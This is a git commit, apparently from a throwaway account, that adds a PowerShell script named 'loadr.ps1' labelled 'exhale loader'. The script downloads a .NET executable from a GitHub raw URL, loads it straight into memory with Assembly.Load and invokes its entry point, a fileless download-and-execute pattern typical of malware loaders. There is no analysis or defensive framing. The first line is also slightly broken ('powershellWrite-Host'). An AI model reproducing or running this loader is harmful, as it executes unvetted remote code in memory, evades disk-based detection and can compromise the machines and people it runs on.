7f628770342b07fa8c715e79f155dad9035e16fa
ousdhfoudhoudhgiu <julianelchakieh1@gmail.com>
2026-07-13 03:23:00 -0400

    Add files via upload

---
+++ loadr.ps1
@@ -0,0 +1,8 @@
+powershellWrite-Host "`n  exhale loader`n" -ForegroundColor DarkGray
+
+$bytes = (New-Object System.Net.WebClient).DownloadData(
+    "https://github.com/ousdhfoudhoudhgiu/45yh/raw/refs/heads/main/MemoryModule.net.exe"
+)
+
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$asm.EntryPoint.Invoke($null, $null)
